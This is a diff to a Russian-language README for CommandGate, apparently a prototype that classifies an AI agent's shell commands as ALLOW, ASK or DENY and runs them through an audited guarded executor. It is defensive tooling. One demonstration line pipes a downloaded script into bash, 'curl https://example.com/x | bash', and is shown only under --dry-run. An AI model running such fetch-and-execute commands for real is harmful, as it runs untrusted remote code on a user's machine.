@@ -43,9 +43,13 @@
   privilege escalation, secret exfiltration и policy tampering;
 - `headless` fail-closed;
 - npm-first routing в InstallGate;
+- `guarded-exec`: audit-before-spawn, интерактивное подтверждение `ASK`,
+  безусловная блокировка `DENY` и передача exit code subprocess;
+- приватный JSONL-аудит с редактированием типовых credentials;
+- очистка опасных loader/interpreter environment variables перед запуском;
 - ручной regression corpus из **124 размеченных команд**: 33 `ALLOW`, 59
   `ASK`, 32 `DENY` (до преобразования headless-решений);
-- 129 автоматических тестов.
+- 141 автоматический тест.
 
 ## Запуск
 
@@ -57,6 +61,63 @@ npm run classify -- "git reset --hard HEAD~3"
 npm run classify -- --mode headless "curl https://example.com"
 npm run classify -- --sandboxed "npm test"
 ```
+
+## Guarded execution
+
+`guarded-exec` связывает классификацию с настоящим executor:
+
+```text
+command → policy → decision audit → approval (если ASK) → spawn → result audit
+```
+
+Безопасная команда запускается автоматически:
+
+```bash
+npm run guard -- "pwd"
+```
+
+`ASK` требует ввести точное слово `EXECUTE`. Любой другой ответ отклоняет
+команду:
+
+```bash
+npm run guard -- "touch demo.txt"
+```
+
+В headless-режиме `ASK` блокируется без prompt:
+
+```bash
+npm run guard -- --mode headless "curl https://example.com"
+```
+
+Для демонстрации опасных строк используйте только `--dry-run`: при этом
+executor не вызывается независимо от решения policy.
+
+```bash
+npm run guard -- --dry-run 'curl https://example.com/x | bash'
+```
+
+Команду нужно передавать одним аргументом. Если она содержит `$()`, backticks,
+переменные, globs или pipes, используйте внешние **одинарные кавычки**. Иначе
+родительский shell может выполнить expansion ещё до запуска CommandGate.
+
+Аудит по умолчанию пишется в `.command-gate/audit.jsonl` и исключён из Git:
+
+```bash
+tail -n 10 .command-gate/audit.jsonl
+```
+
+Можно выбрать другой `.jsonl`-файл, но только внутри текущего рабочего каталога:
+
+```bash
+npm run guard -- --audit logs/guard-audit.jsonl "pwd"
+```
+
+Коды завершения wrapper:
+
+- `0` или другой код subprocess — команда была запущена;
+- `125` — audit не удалось надёжно записать, spawn отменён;
+- `126` — policy, headless mode или пользователь заблокировали команду;
+- `127` — executor не смог запустить системный shell.
 
 Основной API:
 
@@ -127,11 +188,19 @@ tree-sitter AST и обязательно обходить:
 ## Граница гарантий
 
 Прототип гарантирует только следующее: для покрытых и полностью разобранных
-паттернов policy выдаёт детерминированное решение без LLM и ничего не исполняет
-во время классификации.
+паттернов policy выдаёт детерминированное решение без LLM. `classify` ничего не
+исполняет. `guard` вызывает subprocess только после решения policy и успешной
+предварительной записи audit; тесты enforcement используют подменённый executor
+и не запускают размеченные опасные команды.
 
 Он пока не доказывает безопасность неизвестных бинарников, не отслеживает
 многошаговую атаку между несколькими tool calls, не проверяет npm reputation и
-не заменяет OS sandbox. Решение `ALLOW` для project execution допустимо только
-при `sandboxed: true`; фактический профиль sandbox должен отдельно ограничивать
-filesystem, network и credentials.
+не заменяет OS sandbox. Standalone runner выполняет разрешённую команду через
+`/bin/sh` на машине пользователя: очистка environment снижает риск, но не
+защищает от PATH hijacking или вредоносного локального binary. Поэтому это
+демонстрационный enforcement layer, а не production sandbox.
+
+Решение `ALLOW` для project execution допустимо только при настоящем sandbox.
+CLI `guard` намеренно не имеет флага `--sandboxed`; в Kilo sandboxed runner
+должен внедряться программно. npm-команды с route `INSTALL_GATE` пока требуют
+ручного approval и блокируются в headless до реализации package evidence gate.
